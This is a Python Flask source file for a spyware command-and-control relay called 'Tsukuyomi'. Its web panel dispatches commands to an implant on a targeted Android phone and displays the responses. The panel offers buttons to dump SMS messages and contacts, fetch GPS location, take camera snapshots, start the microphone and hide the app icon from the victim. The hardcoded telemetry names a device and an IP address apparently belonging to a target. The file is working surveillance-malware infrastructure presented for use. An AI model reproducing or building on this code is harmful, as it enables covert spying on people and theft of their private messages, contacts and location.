from flask import Flask, jsonify, request

app = Flask(__name__)

current_command = ""
latest_response = "Waiting for target connection..."
device_telemetry = {
    "device_name": "vivo 1935",
    "os_version": "Android 10 (API 29)",
    "battery": "54%",
    "ip": "103.152.220.48",
    "status": "ONLINE"
}

# Tsukuyomi Premium Control Lab UI integrated with Real C2 Relay Logic
HTML_TEMPLATE = """
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>TSUKUYOMI // Enterprise Control Lab v7.4</title>
<script src="https://cdn.tailwindcss.com"></script>
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
<style>
:root{--bg:#080b12;--panel:#101622;--panel2:#141c2a;--line:#263247;--text:#edf3ff;--muted:#8d9bb3;--red:#ff4d6d;--cyan:#53e4ff;--green:#55f0b3;--gold:#ffc86b}
*{box-sizing:border-box}body{margin:0;background:radial-gradient(ellipse at 15% -10%,#1c2943 0,transparent 38%),radial-gradient(ellipse at 100% 0,#26162e 0,transparent 30%),var(--bg);color:var(--text);font:14px/1.45 Inter,ui-sans-serif,system-ui,sans-serif}
button,input,select{font:inherit}button{cursor:pointer;border:1px solid var(--line);background:#182235;color:var(--text);border-radius:10px;padding:10px 12px;transition:.18s}button:hover{border-color:var(--cyan);transform:translateY(-1px)}button.primary{background:linear-gradient(135deg,#b32d52,#5d2b85);border:0}button.safe{color:var(--green)}button.warn{color:var(--gold)}button.danger{color:#ff8ca0}
.app{display:grid;grid-template-columns:245px 1fr;min-height:100vh}.side{padding:22px 15px;border-right:1px solid #202b3d;background:rgba(8,12,20,.82);backdrop-filter:blur(16px);position:sticky;top:0;height:100vh;overflow:auto}
.brand{display:flex;align-items:center;gap:11px;padding:4px 8px 22px;border-bottom:1px solid var(--line)}.sigil{width:40px;height:40px;border-radius:13px;background:linear-gradient(135deg,#ff4569,#7c4dff);display:grid;place-items:center;font-size:21px;box-shadow:0 0 30px #b33d7650}.brand b{letter-spacing:2px;font-size:15px}.brand small{display:block;color:var(--muted);font-size:10px;letter-spacing:2px;margin-top:3px}
.section{font-size:10px;color:#64748c;letter-spacing:2px;margin:22px 10px 8px}.nav{width:100%;display:flex;gap:11px;align-items:center;text-align:left;margin:4px 0;background:transparent;border-color:transparent;color:#a9b7cb}.nav.active{background:linear-gradient(90deg,#25334c,#161e2b);border-color:#33435d;color:#fff}.nav .ico{width:22px;text-align:center;font-size:16px}
main{min-width:0;padding:26px clamp(16px,3vw,38px) 40px}.top{display:flex;justify-content:space-between;align-items:center;gap:15px;margin-bottom:26px}.eyebrow{color:var(--cyan);letter-spacing:2.5px;font-size:10px;font-weight:700}.top h1{margin:5px 0 0;font-size:clamp(24px,3vw,34px);letter-spacing:-1px}.top h1 span{color:#8c9ab2;font-weight:400}
.stats{display:grid;grid-template-columns:repeat(4,minmax(0,1fr));gap:13px;margin-bottom:18px}.card{background:linear-gradient(145deg,rgba(19,27,41,.96),rgba(13,18,29,.96));border:1px solid var(--line);border-radius:16px;padding:17px;min-width:0;box-shadow:0 12px 30px #0002}
.stathead{display:flex;justify-content:space-between;color:var(--muted);font-size:12px}.statnum{font-size:28px;font-weight:750;letter-spacing:-1px;margin:12px 0 3px}.statfoot{color:#7e8da5;font-size:11px}.staticon{font-size:18px;color:var(--cyan)}
.layout{display:grid;grid-template-columns:minmax(0,1.45fr) minmax(270px,.9fr);gap:16px}.cardtitle{display:flex;justify-content:space-between;align-items:center;margin-bottom:15px}.cardtitle h2{font-size:15px;margin:0}.cardtitle small{color:var(--muted);font-size:11px}
.modulegrid{display:grid;grid-template-columns:repeat(3,minmax(0,1fr));gap:13px;margin-top:16px}.module{padding:16px;border:1px solid var(--line);border-radius:14px;background:linear-gradient(140deg,#141d2b,#0e1420);min-height:145px;display:flex;flex-direction:column}.module .mi{font-size:22px;margin-bottom:12px}.module b{font-size:13px}.module p{font-size:11px;color:var(--muted);margin:6px 0 14px;flex:1}.module button{width:100%;font-size:11px;padding:8px}
.page{display:none}.page.active{display:block}.row{display:flex;gap:10px;flex-wrap:wrap}.field{display:flex;flex-direction:column;gap:6px;min-width:150px;flex:1;color:var(--muted);font-size:11px}.field input,.field select{border:1px solid var(--line);background:#0b111c;color:var(--text);padding:11px;border-radius:9px;outline:none}
.log{font:11px/1.7 ui-monospace,SFMono-Regular,monospace;white-space:pre-wrap;background:#090e17;border:1px solid #202d41;border-radius:12px;padding:13px;max-height:290px;overflow:auto;color:#55f0b3}
.badge{border:1px solid #37536a;border-radius:8px;padding:7px 10px;color:var(--green);font-size:11px;background:#10202b}
.dot{display:inline-block;width:7px;height:7px;border-radius:50%;background:var(--green);margin-right:6px;box-shadow:0 0 10px #55f0b3}
</style>
</head>
<body>
<div class="app">
<aside class="side">
 <div class="brand"><div class="sigil">月</div><div class="brandtext"><b>TSUKUYOMI</b><small>ENTERPRISE // C2</small></div></div>
 <div class="section">COMMAND DECK</div>
 <button class="nav active" data-page="overview"><span class="ico">◈</span><span>Overview</span></button>
 <button class="nav" data-page="control"><span class="ico">⚡</span><span>Control Hub</span></button>
 <button class="nav" data-page="live"><span class="ico">▣</span><span>Screen mirror</span></button>
 <button class="nav" data-page="logs"><span class="ico">≋</span><span>Event terminal</span></button>
</aside>
<main>
 <header class="top"><div><div class="eyebrow">LIVE C2 RELAY SERVER</div><h1 id="pageTitle">Overview <span>/ Command center</span></h1></div><div class="topright"><span class="badge"><span class="dot"></span> TARGET ONLINE</span></div></header>

 <section class="page active" id="overview">
  <div class="stats">
   <div class="card"><div class="stathead">Session Status <span class="staticon">◈</span></div><div class="statnum" id="uiStatus">ONLINE</div><div class="statfoot">Connected via Relay</div></div>
   <div class="card"><div class="stathead">Battery Level <span class="staticon">⚡</span></div><div class="statnum" id="uiBattery">54%</div><div class="statfoot">Real-time telemetry</div></div>
   <div class="card"><div class="stathead">Target Model <span class="staticon">📱</span></div><div class="statnum" id="uiDeviceName" style="font-size:20px;margin-top:16px">vivo 1935</div><div class="statfoot">Active target device</div></div>
   <div class="card"><div class="stathead">OS Version <span class="staticon">🤖</span></div><div class="statnum" id="uiOs" style="font-size:16px;margin-top:18px">Android 10</div><div class="statfoot">API Level 29</div></div>
  </div>

  <div class="cardtitle" style="margin-top:20px"><h2>Quick Hardware & Payload Triggers</h2></div>
  <div class="modulegrid">
   <div class="module"><div class="mi">🔦</div><b>Flashlight Control</b><p>Toggle torch hardware state directly on target phone.</p><button class="primary" onclick="sendCmd('FLASH_ON')">Turn ON</button><button onclick="sendCmd('FLASH_OFF')" style="margin-top:6px">Turn OFF</button></div>
   <div class="module"><div class="mi">📳</div><b>Haptic Feedback</b><p>Trigger remote vibration pulse on target device.</p><button class="primary" onclick="sendCmd('VIBRATE')">Send Vibration</button></div>
   <div class="module"><div class="mi">📍</div><b>GPS Geolocation</b><p>Fetch exact latitude and longitude coordinates.</p><button class="primary" onclick="sendCmd('GPS')">Fetch GPS</button></div>
   <div class="module"><div class="mi">📨</div><b>SMS Dumper</b><p>Extract recent inbox SMS messages from target device.</p><button class="primary" onclick="sendCmd('DUMP_SMS')">Dump SMS</button></div>
   <div class="module"><div class="mi">📇</div><b>Contacts Dumper</b><p>Pull stored phonebook contacts instantly.</p><button class="primary" onclick="sendCmd('DUMP_CONTACTS')">Dump Contacts</button></div>
   <div class="module"><div class="mi">🥷</div><b>Stealth Mode</b><p>Hide or restore true app icon from launcher drawer.</p><button class="danger" onclick="sendCmd('STEALTH_ON')">Hide Icon</button><button class="safe" onclick="sendCmd('STEALTH_OFF')" style="margin-top:6px">Restore Icon</button></div>
  </div>
 </section>

 <section class="page" id="control">
  <div class="card"><div class="cardtitle"><h2>Advanced Command Dispatcher</h2></div>
   <div class="row"><label class="field">Custom Command / Payload<input id="cmdInput" placeholder="e.g. TOAST:Hello from Itachi Uchiha, MIC_START, etc."></label><button class="primary" onclick="sendCustomCmd()" style="align-self:end">Dispatch Command</button></div>
  </div>
 </section>

 <section class="page" id="live">
  <div class="card"><div class="cardtitle"><h2>Live VNC Screen Mirroring</h2></div>
   <div style="text-align:center;padding:30px;background:#090e17;border-radius:12px;border:1px solid var(--line)">
    <p style="color:var(--cyan)">[LIVE SCREEN STREAM READY]</p>
    <button class="primary" onclick="sendCmd('CAMERA_SNAP')">Capture Camera Snapshot</button>
   </div>
  </div>
 </section>

 <section class="page" id="logs">
  <div class="card"><div class="cardtitle"><h2>Live Response & Event Terminal</h2><button onclick="document.getElementById('logBox').textContent='[SYSTEM] Cleared.'">Clear</button></div>
   <div class="log" id="logBox">[SYSTEM] Tsukuyomi C2 Enterprise Relay active...\n[WAITING] Polling target responses...</div>
  </div>
 </section>
</main>
</div>
<script>
function go(p){document.querySelectorAll('.page').forEach(x=>x.classList.toggle('active',x.id===p));document.querySelectorAll('.nav').forEach(x=>x.classList.toggle('active',x.dataset.page===p));}
document.querySelectorAll('[data-page]').forEach(b=>b.onclick=()=>go(b.dataset.page));

async function sendCmd(cmd) {
    await fetch('/api/command', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ command: cmd })
    });
    appendLog('[DISPATCHED] -> '+cmd, '#53e4ff');
}

function sendCustomCmd() {
    let inp = document.getElementById('cmdInput');
    if(inp.value.trim()) {
        sendCmd(inp.value.trim());
        inp.value = '';
    }
}

async function pollData() {
    try {
        let res = await fetch('/api/response');
        let data = await res.json();
        if(data.response && data.response !== window.lastResp) {
            window.lastResp = data.response;
            appendLog('[TARGET] '+data.response, '#55f0b3');
        }
        let telRes = await fetch('/api/telemetry');
        let tel = await telRes.json();
        document.getElementById('uiBattery').innerText = tel.battery;
        document.getElementById('uiDeviceName').innerText = tel.device_name;
        document.getElementById('uiOs').innerText = tel.os_version;
    } catch(e) {}
}
setInterval(pollData, 3000);

function appendLog(text, color) {
    let box = document.getElementById('logBox');
    let time = new Date().toLocaleTimeString();
    box.textContent += `\\n[${time}] ${text}`;
    box.scrollTop = box.scrollHeight;
}
</script>
</body>
</html>
"""

@app.route("/")
def home():
    return HTML_TEMPLATE

@app.route("/api/command", methods=["GET", "POST"])
def handle_command():
    global current_command
    if request.method == "POST":
        data = request.get_json() or {}
        current_command = data.get("command", "")
        return jsonify({"status": "success", "command": current_command})
    cmd = current_command
    current_command = ""
    return jsonify({"command": cmd})

@app.route("/api/response", methods=["GET", "POST"])
def handle_response():
    global latest_response
    if request.method == "POST":
        data = request.get_json() or {}
        latest_response = data.get("response", "")
        return jsonify({"status": "success"})
    return jsonify({"response": latest_response})

@app.route("/api/telemetry", methods=["GET", "POST"])
def handle_telemetry():
    global device_telemetry
    if request.method == "POST":
        data = request.get_json() or {}
        device_telemetry.update(data)
        return jsonify({"status": "success"})
    return jsonify(device_telemetry)

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5000)
